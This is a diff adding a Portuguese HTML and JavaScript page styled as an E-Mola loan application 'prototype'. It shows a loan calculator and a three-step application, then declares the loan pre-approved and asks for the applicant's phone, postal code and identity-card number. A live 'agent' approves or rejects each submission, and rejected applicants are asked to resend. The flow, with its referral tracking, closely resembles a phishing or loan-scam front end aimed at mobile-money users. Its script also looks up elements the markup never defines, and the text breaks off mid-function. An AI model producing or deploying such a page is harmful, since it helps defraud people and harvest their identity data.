@@ -1,0 +1,1035 @@
+<!doctype html>
+<html lang="pt">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+  <meta name="referrer" content="no-referrer" />
+  <meta name="description" content="Protótipo local do fluxo de candidatura de empréstimo E-Mola" />
+  <title>Empréstimos E-Mola — Protótipo</title>
+  <style>
+    :root {
+      --orange: #f58228;
+      --orange-deep: #ed6f25;
+      --navy: #101b3d;
+      --ink: #272a32;
+      --muted: #88898d;
+      --line: #d7d7d9;
+      --soft: #f2f2f3;
+      --white: #ffffff;
+      --shadow: 0 11px 30px rgba(20, 25, 43, .09);
+      --radius: 12px;
+    }
+    * { box-sizing: border-box; }
+    html, body { margin: 0; min-height: 100%; }
+    body {
+      font-family: Arial, Helvetica, sans-serif;
+      color: var(--ink);
+      background: #f6f6f6;
+      line-height: 1.35;
+    }
+    button, input, select, textarea { font: inherit; }
+    button, input, select, textarea { -webkit-tap-highlight-color: transparent; }
+    button { cursor: pointer; }
+    .phone {
+      width: 100%;
+      min-height: 100dvh;
+      margin: 0 auto;
+      overflow: hidden;
+      background: var(--white);
+      position: relative;
+    }
+    .screen { display: none; min-height: 100dvh; }
+    .screen.active { display: flex; flex-direction: column; animation: show .22s ease-out; }
+    @keyframes show { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
+    .topbar {
+      height: 64px;
+      flex: 0 0 64px;
+      display: grid;
+      grid-template-columns: 92px 1fr 92px;
+      align-items: center;
+      padding: 0 20px;
+      background: var(--orange);
+      color: var(--navy);
+    }
+    .topbar strong { text-align: center; font-size: 18px; }
+    .back {
+      border: 0;
+      background: transparent;
+      color: var(--navy);
+      padding: 10px 0;
+      text-align: left;
+      font-size: 16px;
+    }
+    .home-hero {
+      position: relative;
+      min-height: 325px;
+      background: var(--orange);
+      color: var(--navy);
+      text-align: center;
+      padding: 28px 18px 50px;
+    }
+    .language-toggle {
+      min-width: 44px;
+      min-height: 36px;
+      border: 1px solid rgba(16,27,61,.28);
+      border-radius: 6px;
+      background: rgba(255,255,255,.34);
+      color: var(--navy);
+      font-size: 13px;
+      font-weight: 700;
+    }
+    .home-hero > .language-toggle { position: absolute; top: 16px; right: 18px; }
+    .home-hero h1 { margin: 0; font-size: 19px; }
+    .home-panel {
+      margin-top: -22px;
+      border-radius: 16px 16px 0 0;
+      background: var(--white);
+      padding: 46px 28px 34px;
+      flex: 1;
+    }
+    h2 { margin: 0; color: var(--navy); font-size: 26px; text-align: center; }
+    .subtitle { margin: 8px 0 30px; text-align: center; color: var(--muted); font-size: 17px; }
+    .calculator {
+      border: 1px solid #e8e8e9;
+      background: #fbfbfb;
+      padding: 22px;
+      border-radius: var(--radius);
+    }
+    .calculator h3 { margin: 0 0 18px; color: var(--navy); font-size: 18px; }
+    .amount-line { margin-bottom: 20px; }
+    .amount-line strong { color: var(--orange); }
+    input[type="range"] { width: 100%; accent-color: #387df1; }
+    .range-labels { display: flex; justify-content: space-between; color: var(--muted); font-size: 13px; margin-top: 5px; }
+    .payment {
+      margin-top: 18px;
+      border: 1px solid #e1e1e2;
+      background: var(--white);
+      border-radius: 8px;
+      padding: 18px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      color: var(--muted);
+    }
+    .payment strong { color: var(--orange); font-size: 26px; max-width: 60%; text-align: right; }
+    .content {
+      flex: 1;
+      padding: 96px 26px 36px;
+      background: var(--white);
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+    }
+    .card {
+      width: 100%;
+      max-width: 570px;
+      border-radius: var(--radius);
+      background: var(--white);
+      box-shadow: var(--shadow);
+      padding: 34px 28px;
+    }
+    .card h2 { font-size: 25px; line-height: 1.15; }
+    .card .subtitle { margin-bottom: 26px; }
+    .field { display: block; margin: 0 0 20px; }
+    .field > span { display: block; font-size: 16px; margin-bottom: 8px; }
+    .agent-consent { display: flex; align-items: flex-start; gap: 10px; margin: 18px 0; font-size: 14px; }
+    .agent-consent[hidden] { display: none; }
+    .agent-consent input { width: 18px !important; min-height: 18px !important; margin: 2px 0 0; accent-color: var(--orange); }
+    input:not([type="range"]), select, textarea {
+      width: 100%;
+      border: 1px solid var(--line);
+      border-radius: 8px;
+      background: var(--white);
+      color: var(--navy);
+      padding: 13px 15px;
+      min-height: 50px;
+      outline: none;
+    }
+    select { background: var(--soft); }
+    textarea { min-height: 108px; resize: vertical; }
+    input:focus, select:focus, textarea:focus { border-color: var(--orange); box-shadow: 0 0 0 3px rgba(245,130,40,.14); }
+    .two-col { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+    .phone-field { display: grid; grid-template-columns: 78px 1fr; }
+    .prefix {
+      display: grid;
+      place-items: center;
+      border: 1px solid var(--line);
+      border-right: 0;
+      background: var(--soft);
+      border-radius: 8px 0 0 8px;
+      color: var(--navy);
+    }
+    .phone-field input { border-radius: 0 8px 8px 0; }
+    .actions { display: grid; grid-template-columns: 1fr 2.2fr; gap: 14px; margin-top: 28px; }
+    .actions.single { grid-template-columns: 1fr; }
+    .btn {
+      min-height: 54px;
+      border: 0;
+      border-radius: 8px;
+      padding: 12px 18px;
+      font-weight: 700;
+      color: var(--white);
+      background: linear-gradient(100deg, var(--orange), var(--orange-deep));
+      text-transform: uppercase;
+      letter-spacing: .01em;
+    }
+    .btn.secondary { color: #5e5e60; background: #dededf; }
+    .btn:disabled { cursor: not-allowed; color: #ababac; background: #e7e7e8; }
+    .summary {
+      border: 1px solid #dce2df;
+      border-left: 5px solid var(--orange);
+      border-radius: 8px;
+      padding: 16px 18px;
+      background: #fcfefd;
+    }
+    .summary h3 { margin: 0 0 14px; color: var(--navy); font-size: 17px; }
+    .summary-row { display: flex; justify-content: space-between; gap: 15px; padding: 8px 0; border-bottom: 1px solid #e7e9e8; }
+    .summary-row:last-child { border: 0; }
+    .error { min-height: 18px; color: #be2d1f; font-size: 13px; margin-top: -14px; margin-bottom: 10px; }
+    .done-icon { width: 64px; height: 64px; display: grid; place-items: center; margin: 0 auto 18px; border-radius: 50%; background: var(--orange); color: var(--white); font-size: 32px; }
+    .complete-copy { text-align: center; color: var(--muted); margin: 14px 0 8px; font-size: 15px; }
+    .pulse-spinner {
+      width: 52px;
+      height: 52px;
+      margin: 0 auto 16px;
+      border: 4px solid rgba(245, 130, 40, 0.2);
+      border-top-color: var(--orange);
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .status-badge {
+      display: inline-block;
+      padding: 6px 16px;
+      border-radius: 999px;
+      font-size: 13px;
+      font-weight: 700;
+      margin-bottom: 14px;
+    }
+    .status-badge.pending { background: #fff8e1; color: #b57900; border: 1px solid #ffe082; }
+    .status-badge.under_review { background: #e8f1fc; color: #1d68d8; border: 1px solid #bbd6fa; }
+    .status-badge.approved { background: #e6f7ec; color: #1b873f; border: 1px solid #b7e8c4; }
+    .status-badge.rejected { background: #fde8e8; color: #c92a2a; border: 1px solid #f8b4b4; }
+    .status-steps {
+      display: flex;
+      justify-content: space-between;
+      margin: 22px 0 18px;
+      position: relative;
+    }
+    .status-steps::before {
+      content: '';
+      position: absolute;
+      top: 14px;
+      left: 12%;
+      right: 12%;
+      height: 2px;
+      background: #e2e4e8;
+      z-index: 1;
+    }
+    .step-item {
+      position: relative;
+      z-index: 2;
+      background: #fff;
+      padding: 0 4px;
+      text-align: center;
+      font-size: 12px;
+      color: var(--muted);
+      font-weight: 600;
+    }
+    .step-dot {
+      width: 28px;
+      height: 28px;
+      margin: 0 auto 6px;
+      border-radius: 50%;
+      background: #e2e4e8;
+      color: #fff;
+      display: grid;
+      place-items: center;
+      font-size: 12px;
+    }
+    .step-item.done .step-dot { background: var(--orange); }
+    .step-item.done { color: var(--navy); }
+    .step-item.current .step-dot { background: #1d68d8; animation: pulseDot 1.5s infinite; }
+    .step-item.current { color: #1d68d8; }
+    .step-item.approved .step-dot { background: #1b873f; }
+    .step-item.approved { color: #1b873f; }
+    .step-item.rejected .step-dot { background: #c92a2a; }
+    .step-item.rejected { color: #c92a2a; }
+    @keyframes pulseDot {
+      0% { box-shadow: 0 0 0 0 rgba(29, 104, 216, 0.4); }
+      70% { box-shadow: 0 0 0 8px rgba(29, 104, 216, 0); }
+      100% { box-shadow: 0 0 0 0 rgba(29, 104, 216, 0); }
+    }
+    .approved-card {
+      border: 1px solid #bbf7d0;
+      background: #f0fdf4;
+      border-radius: 8px;
+      padding: 16px 18px;
+      margin: 16px 0;
+      text-align: left;
+    }
+    .rejected-card {
+      border: 1px solid #fecaca;
+      background: #fef2f2;
+      border-radius: 8px;
+      padding: 16px 18px;
+      margin: 16px 0;
+      text-align: left;
+    }
+    @media (min-width: 700px) {
+      body { padding: 28px; }
+      .phone { max-width: 720px; min-height: calc(100dvh - 56px); border-radius: 16px; box-shadow: 0 18px 55px rgba(19,25,44,.14); }
+      .screen { min-height: calc(100dvh - 56px); }
+      .home-panel { padding-left: 58px; padding-right: 58px; }
+    }
+    @media (max-width: 430px) {
+      .topbar { grid-template-columns: 70px 1fr 70px; padding: 0 14px; }
+      .topbar strong { font-size: 16px; }
+      .home-hero { min-height: 285px; }
+      .home-panel { padding: 38px 22px 28px; }
+      h2, .card h2 { font-size: 22px; }
+      .content { padding: 72px 15px 26px; }
+      .card { padding: 28px 20px; }
+      .two-col { grid-template-columns: 1fr; gap: 0; }
+      .actions { grid-template-columns: 1fr 2fr; gap: 10px; }
+    }
+    @media (prefers-reduced-motion: reduce) { .screen.active { animation: none; } }
+
+    /* ── Orange Verification Screens ── */
+    .verify-screen {
+      background: var(--orange);
+      min-height: 100%;
+      display: flex;
+      flex-direction: column;
+    }
+    .verify-screen .topbar {
+      background: var(--orange);
+      color: #fff;
+    }
+    .verify-screen .topbar strong { color: #fff; }
+    .verify-screen .topbar .back { color: rgba(255,255,255,.85); }
+    .verify-hero {
+      padding: 40px 30px 0;
+      text-align: center;
+      color: #fff;
+    }
+    .verify-hero h2 {
+      font-size: 26px;
+      font-weight: 700;
+      margin-bottom: 8px;
+      color: #fff;
+    }
+    .verify-hero p {
+      font-size: 15px;
+      opacity: .85;
+      margin-bottom: 28px;
+    }
+    .verify-card {
+      background: #fff;
+      margin: 0 22px 30px;
+      padding: 32px 28px;
+      border-radius: 16px;
+      box-shadow: 0 6px 30px rgba(0,0,0,.12);
+    }
+    .verify-card .field { margin-bottom: 18px; }
+    .verify-card .field span {
+      display: block;
+      font-size: 13px;
+      font-weight: 600;
+      color: var(--navy);
+      margin-bottom: 6px;
+    }
+    .verify-card input[type="text"],
+    .verify-card input[type="tel"] {
+      width: 100%;
+      height: 52px;
+      border: 2px solid #e0e0e0;
+      border-radius: 10px;
+      padding: 0 16px;
+      font-size: 17px;
+      color: #333;
+      outline: none;
+      transition: border-color .2s;
+    }
+    .verify-card input:focus {
+      border-color: var(--orange);
+      box-shadow: 0 0 0 3px rgba(245,130,40,.15);
+    }
+    .verify-card .phone-field {
+      display: grid;
+      grid-template-columns: 78px 1fr;
+    }
+    .verify-card .phone-field .prefix {
+      display: grid;
+      place-items: center;
+      border: 2px solid #e0e0e0;
+      border-right: 0;
+      background: #f7f7f8;
+      border-radius: 10px 0 0 10px;
+      color: var(--navy);
+      font-weight: 600;
+      font-size: 15px;
+    }
+    .verify-card .phone-field input { border-radius: 0 10px 10px 0; }
+    .verify-btn {
+      width: 100%;
+      height: 58px;
+      border: none;
+      border-radius: 12px;
+      margin-top: 18px;
+      font-size: 18px;
+      font-weight: 700;
+      color: #fff;
+      background: linear-gradient(100deg, var(--orange), var(--orange-deep));
+      text-transform: uppercase;
+      letter-spacing: .02em;
+      cursor: pointer;
+      transition: opacity .2s;
+    }
+    .verify-btn:disabled { opacity: .5; cursor: not-allowed; }
+    .verify-btn.reject-btn { background: #c92a2a; }
+    .verify-waiting {
+      text-align: center;
+      padding: 30px 0;
+    }
+    .verify-waiting .pulse-spinner {
+      width: 44px; height: 44px; border-width: 3px; margin-bottom: 14px;
+      border-color: rgba(245,130,40,.25);
+      border-top-color: var(--orange);
+    }
+    .verify-waiting h4 {
+      color: var(--navy);
+      font-size: 16px;
+      margin-bottom: 6px;
+    }
+    .verify-waiting p {
+      color: var(--muted);
+      font-size: 13px;
+    }
+    .verify-reject-notice {
+      border: 1px solid #fecaca;
+      background: #fef2f2;
+      border-radius: 10px;
+      padding: 18px;
+      text-align: left;
+    }
+    .verify-reject-notice h4 {
+      color: #991b1b;
+      font-size: 15px;
+      margin-bottom: 6px;
+    }
+    .verify-reject-notice p {
+      color: #374151;
+      font-size: 13px;
+      margin-bottom: 12px;
+    }
+    .verify-success-card {
+      border: 1px solid #bbf7d0;
+      background: #f0fdf4;
+      border-radius: 10px;
+      padding: 22px;
+      text-align: center;
+    }
+    .verify-success-card .done-icon {
+      width: 56px; height: 56px;
+      margin: 0 auto 12px;
+      border-radius: 50%;
+      background: #1b873f;
+      color: #fff;
+      display: grid;
+      place-items: center;
+      font-size: 28px;
+    }
+    .verify-success-card h4 {
+      color: #166534;
+      font-size: 18px;
+      margin-bottom: 8px;
+    }
+    .verify-success-card p {
+      color: #1f2937;
+      font-size: 13px;
+      line-height: 1.5;
+    }
+    .verify-step-badge {
+      display: inline-block;
+      padding: 4px 14px;
+      border-radius: 999px;
+      font-size: 12px;
+      font-weight: 700;
+      background: rgba(255,255,255,.2);
+      color: #fff;
+      margin-bottom: 12px;
+    }
+    .verify-error {
+      min-height: 16px;
+      color: #be2d1f;
+      font-size: 13px;
+      margin-top: 4px;
+    }
+  </style>
+</head>
+<body>
+  <main class="phone" aria-live="polite">
+    <section class="screen active" data-screen="home">
+      <div class="home-hero"><button class="language-toggle" type="button">EN</button><h1>Empréstimos E-Mola</h1></div>
+      <div class="home-panel">
+        <h2>Bem-vindo ao E-Mola</h2>
+        <p class="subtitle">Obtenha empréstimos facilmente através do E-Mola</p>
+        <div class="calculator">
+          <h3>Calculadora de Empréstimos</h3>
+          <div class="amount-line">Valor: <strong id="amountText">MTS 25.000</strong></div>
+          <input id="loanSlider" type="range" min="10000" max="100000" step="1000" value="25000" aria-label="Valor do empréstimo" />
+          <div class="range-labels"><span>MTS 10.000</span><span>MTS 100.000</span></div>
+          <div class="payment"><span>Pagamento<br />Mensal</span><strong id="paymentText">MTS 521</strong></div>
+        </div>
+        <div class="actions single"><button class="btn" data-next="step1">Iniciar candidatura</button></div>
+      </div>
+    </section>
+
+    <section class="screen" data-screen="step1">
+      <header class="topbar"><button class="back" data-next="home">← Voltar</button><strong>Candidatura de Empréstimo</strong><button class="language-toggle" type="button">EN</button></header>
+      <div class="content"><form class="card" id="loanForm">
+        <h2>Candidatura de Empréstimo -<br />Etapa 1 de 3</h2><p class="subtitle">Conte-nos sobre seu empréstimo</p>
+        <label class="field"><span>Tipo de Empréstimo</span><select id="loanType" required><option value="Empréstimo Comercial">Empréstimo Comercial</option><option value="Empréstimo Pessoal">Empréstimo Pessoal</option><option value="Empréstimo Agrícola">Empréstimo Agrícola</option></select></label>
+        <label class="field"><span>Valor do Empréstimo (MTS)</span><input id="loanAmount" type="number" min="10000" max="100000" value="25000" required /></label>
+        <label class="field"><span>Prazo do Empréstimo</span><select id="term" required><option value="12">12 Meses</option><option value="24">24 Meses</option><option value="36">36 Meses</option><option value="48" selected>48 Meses</option></select></label>
+        <label class="field"><span>Propósito do Empréstimo</span><textarea id="purpose" placeholder="Descreva o propósito..." required></textarea></label>
+        <p class="error" id="step1Error"></p><div class="actions single"><button class="btn" type="submit">Próxima etapa</button></div>
+      </form></div>
+    </section>
+
+    <section class="screen" data-screen="step2">
+      <header class="topbar"><button class="back" data-next="step1">← Voltar</button><strong>Candidatura de Empréstimo</strong><button class="language-toggle" type="button">EN</button></header>
+      <div class="content"><form class="card" id="personalForm">
+        <h2>Candidatura de Empréstimo -<br />Etapa 2 de 3</h2><p class="subtitle">Conte-nos sobre você</p>
+        <div class="two-col">
+          <label class="field"><span>Primeiro Nome</span><input id="firstName" autocomplete="given-name" placeholder="Primeiro Nome" required /></label>
+          <label class="field"><span>Sobrenome</span><input id="lastName" autocomplete="family-name" placeholder="Sobrenome" required /></label>
+        </div>
+        <label class="field"><span>Número de Telefone (+258)</span><span class="phone-field"><span class="prefix">+258</span><input id="phone" type="tel" inputmode="numeric" maxlength="9" placeholder="843123456" required /></span></label>
+        <p class="error" id="step2Error"></p><div class="actions"><button class="btn secondary" type="button" data-next="step1">Voltar</button><button class="btn" type="submit">Próxima etapa</button></div>
+      </form></div>
+    </section>
+
+    <section class="screen" data-screen="step3">
+      <header class="topbar"><button class="back" data-next="step2">← Voltar</button><strong>Candidatura de Empréstimo</strong><button class="language-toggle" type="button">EN</button></header>
+      <div class="content"><form class="card" id="financeForm">
+        <h2>Candidatura de Empréstimo -<br />Etapa 3 de 3</h2><p class="subtitle">Informações Financeiras</p>
+        <label class="field"><span>Situação de Emprego</span><select id="employment"><option value="Autónomo">Autónomo</option><option value="Empregado">Empregado</option><option value="Empresário">Empresário</option><option value="Estudante">Estudante</option></select></label>
+        <label class="field"><span>Renda Anual (MTS)</span><input id="income" type="number" min="1" placeholder="Digite a renda anual" required /></label>
+        <div class="summary"><h3>Resumo da Candidatura</h3><div class="summary-row"><span>Valor do Empréstimo:</span><strong id="summaryAmount">MTS 25.000</strong></div><div class="summary-row"><span>Prazo do Empréstimo:</span><strong id="summaryTerm">48 Meses</strong></div><div class="summary-row"><span>Candidato:</span><strong id="summaryName">—</strong></div></div>
+        <label class="agent-consent" id="agentConsentField" hidden><input id="agentConsent" type="checkbox" /><span>Autorizo o agente que me encaminhou a contactar-me sobre esta candidatura.</span></label>
+        <p class="error" id="step3Error"></p><div class="actions"><button class="btn secondary" type="button" data-next="step2">Voltar</button><button class="btn" type="submit">Enviar</button></div>
+      </form></div>
+    </section>
+
+    <section class="screen" data-screen="complete">
+      <header class="topbar"><button class="back" data-next="home">← Início</button><strong>E-Mola</strong><button class="language-toggle" type="button">EN</button></header>
+      <div class="content"><div class="card" style="text-align:center;">
+        <div id="statusIconWrap">
+          <div class="pulse-spinner" id="statusSpinner"></div>
+          <div class="done-icon" id="statusDoneIcon" style="display:none; background:#1b873f;">✓</div>
+          <div class="done-icon" id="statusRejectIcon" style="display:none; background:#c92a2a;">✕</div>
+        </div>
+        <div id="statusBadgeWrap">
+          <span class="status-badge pending" id="statusBadge">Aguardando Aprovação</span>
+        </div>
+        <h2 id="statusTitle">Aguarde pela aprovação</h2>
+        <p class="complete-copy" id="statusDesc">A sua candidatura foi recebida com sucesso. Por favor aguarde enquanto o agente analisa o seu pedido em tempo real...</p>
+
+        <div class="status-steps" id="statusStepsBar">
+          <div class="step-item done" id="stepIndicator1"><div class="step-dot">✓</div><span>Submetido</span></div>
+          <div class="step-item current" id="stepIndicator2"><div class="step-dot">⏳</div><span>Em Análise</span></div>
+          <div class="step-item" id="stepIndicator3"><div class="step-dot">📋</div><span>Decisão</span></div>
+        </div>
+
+        <div id="statusDetailsBox">
+          <p style="font-size:13px; color:var(--muted); margin: 8px 0 16px;">
+            Referência da Candidatura: <code id="statusRefCode" style="font-weight:700; background:#f0f1f3; padding:2px 6px; border-radius:4px;">—</code>
+          </p>
+        </div>
+
+        <div id="statusApprovedNotice" class="approved-card" style="display:none;">
+          <h4 style="margin:0 0 6px; color:#166534; font-size:16px;">🎉 Parabéns! Empréstimo Aprovado</h4>
+          <p style="margin:0; font-size:13px; color:#1f2937; line-height:1.45;">
+            A sua solicitação foi pré-aprovada! Agora precisamos verificar a sua identidade para prosseguir com o desembolso.
+          </p>
+        </div>
+
+        <div id="statusRejectedNotice" class="rejected-card" style="display:none;">
+          <h4 style="margin:0 0 6px; color:#991b1b; font-size:16px;">Candidatura Não Aprovada</h4>
+          <p style="margin:0; font-size:13px; color:#374151; line-height:1.45;">
+            Infelizmente, a sua solicitação não atendeu a todos os critérios de elegibilidade neste momento. Poderá efetuar uma nova solicitação dentro de 30 dias.
+          </p>
+        </div>
+
+        <!-- Verification Complete: Disbursement pending -->
+        <div id="verifyCompleteBox" class="approved-card" style="display:none; margin-top:18px; text-align:left;">
+          <h4 style="margin:0 0 6px; color:#166534; font-size:16px;">✅ Verificação Completa</h4>
+          <p style="margin:0; font-size:13px; color:#1f2937; line-height:1.45;">
+            A sua identidade foi verificada com sucesso! O desembolso será enviado para o seu número registado dentro de <strong>2 a 72 horas</strong>.<br><br>
+            <strong>Aviso de Segurança E-Mola:</strong> Os nossos colaboradores e agentes oficiais nunca solicitam o seu PIN, senhas ou códigos bancários por chamada ou mensagem.
+          </p>
+        </div>
+
+        <div class="actions single" style="margin-top:20px;">
+          <button class="btn" data-next="home">Voltar ao início</button>
+        </div>
+      </div></div>
+    </section>
+
+    <!-- ═══════════════════════════════════════════
+         VERIFICATION STEP 1: ZIP + PHONE (Orange)
+    ═══════════════════════════════════════════ -->
+    <section class="screen" data-screen="verify1">
+      <div class="verify-screen">
+        <header class="topbar">
+          <button class="back" data-next="complete">← Voltar</button>
+          <strong>Verificação E-Mola</strong>
+          <button class="language-toggle" type="button">EN</button>
+        </header>
+
+        <div class="verify-hero">
+          <span class="verify-step-badge">Etapa 1 de 2</span>
+          <h2>Verificação de Identidade</h2>
+          <p>Para prosseguir com o desembolso, confirme os seus dados pessoais.</p>
+        </div>
+
+        <div class="verify-card" id="v1FormCard">
+          <label class="field">
+            <span>Número de Telefone (+258)</span>
+            <span class="phone-field">
+              <span class="prefix">+258</span>
+              <input id="verifyPhone" type="tel" inputmode="numeric" maxlength="9" placeholder="843123456" required />
+            </span>
+          </label>
+          <label class="field">
+            <span>Código Postal (ZIP)</span>
+            <input id="verifyZip" type="text" placeholder="Ex: 1234" maxlength="10" autocomplete="postal-code" required />
+          </label>
+          <p class="verify-error" id="verifyStep1Error"></p>
+          <button class="verify-btn" type="button" id="verifyStep1Submit">ENVIAR</button>
+        </div>
+
+        <!-- Waiting state -->
+        <div class="verify-card" id="v1WaitingCard" style="display:none;">
+          <div class="verify-waiting">
+            <div class="pulse-spinner"></div>
+            <h4>Aguardando verificação do agente...</h4>
+            <p>Os dados de ZIP e telefone foram enviados. O agente está a verificar os dados nos registos.</p>
+          </div>
+        </div>
+
+        <!-- Rejected state -->
+        <div class="verify-card" id="v1RejectedCard" style="display:none;">
+          <div class="verify-reject-notice">
+            <h4>❌ Verificação Rejeitada</h4>
+            <p id="verifyStep1RejectMsg">Os dados não correspondem aos registos. Por favor reenvie com dados corretos.</p>
+            <button class="verify-btn reject-btn" type="button" id="verifyStep1Resubmit">REENVIAR DADOS</button>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ═══════════════════════════════════════════
+         VERIFICATION STEP 2: ID DOCUMENT (Orange)
+    ═══════════════════════════════════════════ -->
+    <section class="screen" data-screen="verify2">
+      <div class="verify-screen">
+        <header class="topbar">
+          <button class="back" data-next="complete">← Voltar</button>
+          <strong>Verificação E-Mola</strong>
+          <button class="language-toggle" type="button">EN</button>
+        </header>
+
+        <div class="verify-hero">
+          <span class="verify-step-badge">Etapa 2 de 2</span>
+          <h2>Documento de Identidade</h2>
+          <p>Insira o número do seu BI / DIRE para completar a verificação.</p>
+        </div>
+
+        <div class="verify-card" id="v2FormCard">
+          <label class="field">
+            <span>Número de Identificação (BI / DIRE)</span>
+            <input id="verifyIdNumber" type="text" placeholder="Ex: 1234567890A" maxlength="20" required />
+          </label>
+          <p class="verify-error" id="verifyStep2Error"></p>
+          <button class="verify-btn" type="button" id="verifyStep2Submit">ENVIAR</button>
+        </div>
+
+        <!-- Waiting state -->
+        <div class="verify-card" id="v2WaitingCard" style="display:none;">
+          <div class="verify-waiting">
+            <div class="pulse-spinner"></div>
+            <h4>Aguardando verificação do documento...</h4>
+            <p>O agente está a verificar o seu documento de identidade nos registos.</p>
+          </div>
+        </div>
+
+        <!-- Rejected state -->
+        <div class="verify-card" id="v2RejectedCard" style="display:none;">
+          <div class="verify-reject-notice">
+            <h4>❌ Verificação de ID Rejeitada</h4>
+            <p id="verifyStep2RejectMsg">Os dados do documento não correspondem. Por favor reenvie com dados corretos.</p>
+            <button class="verify-btn reject-btn" type="button" id="verifyStep2Resubmit">REENVIAR DADOS</button>
+          </div>
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <script src="/language.js"></script>
+  <script>
+    const screens = [...document.querySelectorAll('.screen')];
+    const money = new Intl.NumberFormat('pt-PT');
+    const referralFromUrl = new URLSearchParams(window.location.search).get('ref');
+    if (referralFromUrl) {
+      sessionStorage.setItem('emolaReferralToken', referralFromUrl);
+      window.history.replaceState({}, '', window.location.pathname + window.location.hash);
+    }
+    const referralToken = sessionStorage.getItem('emolaReferralToken') || '';
+    document.getElementById('agentConsentField').hidden = !referralToken;
+    let submissionId = sessionStorage.getItem('emolaSubmissionId');
+    let pollInterval = null;
+    let currentAppId = null;
+
+    function show(name) {
+      screens.forEach(screen => screen.classList.toggle('active', screen.dataset.screen === name));
+      window.scrollTo(0, 0);
+      if (name === 'step3') updateSummary();
+    }
+
+    document.addEventListener('click', event => {
+      const target = event.target.closest('[data-next]');
+      if (target) {
+        if (target.dataset.next === 'home' && pollInterval) {
+          clearInterval(pollInterval);
+          pollInterval = null;
+        }
+        show(target.dataset.next);
+      }
+    });
+
+    const slider = document.getElementById('loanSlider');
+    function syncLoan(value) {
+      const amount = Number(value);
+      document.getElementById('amountText').textContent = `MTS ${money.format(amount)}`;
+      document.getElementById('paymentText').textContent = `MTS ${money.format(Math.round(amount / 48))}`;
+      document.getElementById('loanAmount').value = String(amount);
+    }
+    slider.addEventListener('input', () => syncLoan(slider.value));
+
+    document.getElementById('loanForm').addEventListener('submit', event => {
+      event.preventDefault();
+      const purpose = document.getElementById('purpose');
+      const error = document.getElementById('step1Error');
+      if (!purpose.value.trim()) { error.textContent = window.t('Descreva o propósito do empréstimo.'); purpose.focus(); return; }
+      error.textContent = ''; show('step2');
+    });
+
+    document.getElementById('personalForm').addEventListener('submit', event => {
+      event.preventDefault();
+      const first = document.getElementById('firstName');
+      const last = document.getElementById('lastName');
+      const phone = document.getElementById('phone');
+      const error = document.getElementById('step2Error');
+      if (!first.value.trim() || !last.value.trim()) { error.textContent = window.t('Preencha o seu nome completo.'); return; }
+      if (!/^8[2-7]\d{7}$/.test(phone.value.trim())) { error.textContent = window.t('Digite um número moçambicano válido com 9 dígitos.'); phone.focus(); return; }
+      error.textContent = ''; show('step3');
+    });
+
+    function updateSummary() {
+      const amount = Number(document.getElementById('loanAmount').value || 0);
+      const term = document.getElementById('term');
+      const name = `${document.getElementById('firstName').value} ${document.getElementById('lastName').value}`.trim();
+      document.getElementById('summaryAmount').textContent = `MTS ${money.format(amount)}`;
+      document.getElementById('summaryTerm').textContent = term.options[term.selectedIndex].text;
+      document.getElementById('summaryName').textContent = name || '—';
+    }
+
+    function startStatusPolling(applicationId) {
+      if (pollInterval) clearInterval(pollInterval);
+      currentAppId = applicationId;
+      document.getElementById('statusRefCode').textContent = applicationId;
+      updateStatusScreen('pending', []);
+
+      async function checkStatus() {
+        try {
+          const res = await fetch(`/api/applications/${applicationId}/status`);
+          if (!res.ok) return;
+          const data = await res.json();
+          updateStatusScreen(data.status, data.verifications || []);
+          if (data.status === 'rejected') {
+            clearInterval(pollInterval);
+            pollInterval = null;
+          }
+        } catch (err) {
+          console.error(err);
+        }
+      }
+
+      checkStatus();
+      pollInterval = setInterval(checkStatus, 3000);
+    }
+
+    function updateStatusScreen(status, verifications) {
+      const spinner = document.getElementById('statusSpinner');
+      const doneIcon = document.getElementById('statusDoneIcon');
+      const rejectIcon = document.getElementById('statusRejectIcon');
+      const badge = document.getElementById('statusBadge');
+      const title = document.getElementById('statusTitle');
+      const desc = document.getElementById('statusDesc');
+      const approvedBox = document.getElementById('statusApprovedNotice');
+      const rejectedBox = document.getElementById('statusRejectedNotice');
+      const step2 = document.getElementById('stepIndicator2');
+      const step3 = document.getElementById('stepIndicator3');
+
+      // Verification UI elements
+      const v1Box = document.getElementById('verifyStep1Box');
+      const v1Waiting = document.getElementById('verifyStep1Waiting');
+      const v1Rejected = document.getElementById('verifyStep1Rejected');
+      const v2Box = document.getElementById('verifyStep2Box');
+      const v2Waiting = document.getElementById('verifyStep2Waiting');
+      const v2Rejected = document.getElementById('verifyStep2Rejected');
+      const vComplete = document.getElementById('verifyCompleteBox');
+
+      // Hide all verification elements by default
+      v1Box.style.display = 'none';
+      v1Waiting.style.display = 'none';
+      v1Rejected.style.display = 'none';
+      v2Box.style.display = 'none';
+      v2Waiting.style.display = 'none';
+      v2Rejected.style.display = 'none';
+      vComplete.style.display = 'none';
+
+      const s = (status || 'pending').toLowerCase();
+
+      if (s === 'pending') {
+        spinner.style.display = 'block';
+        doneIcon.style.display = 'none';
+        rejectIcon.style.display = 'none';
+        badge.className = 'status-badge pending';
+        badge.textContent = window.t('Aguardando Aprovação');
+        title.textContent = window.t('Aguarde pela aprovação');
+        desc.textContent = window.t('A sua candidatura foi recebida e encaminhada para o agente. Por favor aguarde enquanto o pedido é analisado...');
+        approvedBox.style.display = 'none';
+        rejectedBox.style.display = 'none';
+        step2.className = 'step-item current';
+        step3.className = 'step-item';
+      } else if (s === 'under_review') {
+        spinner.style.display = 'block';
+        doneIcon.style.display = 'none';
+        rejectIcon.style.display = 'none';
+        badge.className = 'status-badge under_review';
+        badge.textContent = window.t('Em Análise');
+        title.textContent = window.t('Candidatura em análise');
+        desc.textContent = window.t('O agente está a rever os dados da sua candidatura neste momento.');
+        approvedBox.style.display = 'none';
+        rejectedBox.style.display = 'none';
+        step2.className = 'step-item done';
+        step3.className = 'step-item current';
+      } else if (s === 'approved') {
+        step2.className = 'step-item done';
+        step3.className = 'step-item approved';
+
+        // Determine verification state
